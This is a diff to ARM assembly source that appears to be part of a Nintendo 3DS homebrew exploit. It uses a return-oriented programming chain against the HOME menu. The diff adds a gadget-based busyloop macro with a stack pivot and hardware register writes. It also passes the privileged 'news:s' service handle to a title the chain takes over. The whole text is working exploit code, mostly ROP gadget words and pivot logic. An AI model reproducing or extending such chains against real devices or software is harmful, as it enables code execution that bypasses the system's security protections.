@@ -962,6 +962,37 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
+.macro busyloop,total
+	.word ROP_MENU_POP_R1PC
+		.word 0x00000000
+	.word ROP_MENU_POP_R4R5PC
+		.word 0xDEADBABE
+		.word DUMMY_PTR - 0x10
+	@@busyloop_start:
+	.word ROP_MENU_ADD_R1R1x1_STR_R1R5x10_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word DUMMY_PTR - 0x10
+		.word 0xDEADBABE
+	.word ROP_MENU_POP_R0PC
+		.word total
+	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+	store ROP_MENU_POP_R4R5PC, MENU_OBJECT_LOC + @@busyloop_pivot
+	.word ROP_MENU_POP_R4PC
+		.word ROP_MENU_STACK_PIVOT ; r4
+	.word ROP_MENU_POP_R0PC
+		.word MENU_OBJECT_LOC + @@busyloop_pivot - 4
+	.word ROP_MENU_STRNE_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+	.word ROP_MENU_POP_R4PC
+		.word MENU_OBJECT_LOC + @@busyloop_data + 4 ; r4 (pivot data location)
+	@@busyloop_pivot:
+	.word ROP_MENU_STACK_PIVOT
+		@@busyloop_data:
+		.word MENU_OBJECT_LOC + @@busyloop_start ; sp
+		.word MENU_NOP ; pc
+.endmacro
+
 .macro infloop
 	set_lr ROP_MENU_BX_LR ; bx lr
 	.word ROP_MENU_BX_LR ; bx lr
@@ -1040,6 +1071,8 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		; flush app_code because we just wrote to it and are about to DMA it
 			flush_dcache MENU_OBJECT_LOC + appCode, 0x4000
 
+			writehwreg 0x202A04, 0x0100FF00
+
 		; launch app that we want to takeover
 			nss_launch_title 0xBABE0004, 0xBABE0005
 
@@ -1047,8 +1080,12 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppCode - object
 
+			; busyloop 3*1000*1000*1000
+
 		; sleep for a bit
 			sleep 200*1000*1000, 0x00000000
+
+			writehwreg 0x202A04, 0x0100FFFF
 
 		; release gsp rights
 			gsp_release_right
@@ -1063,6 +1100,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + amsysString, MENU_AMSYS_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + ptmsysmString, MENU_PTMSYSM_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + gsplcdString, MENU_GSPLCD_HANDLE
+			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + newssString, MENU_NEWSS_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + hbMem0String, MENU_SHAREDMEMBLOCK_HANDLE
 			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + hbNdspString, MENU_SHAREDDSPBLOCK_HANDLE
 
@@ -1133,6 +1171,10 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.byte 0x00
 	gsplcdString:
 		.ascii "gsp::Lcd"
+		.byte 0x00
+	newssString:
+		.ascii "news:s"
+		.byte 0x00
 		.byte 0x00
 	hbMem0String:
 		.ascii "hb:mem0"
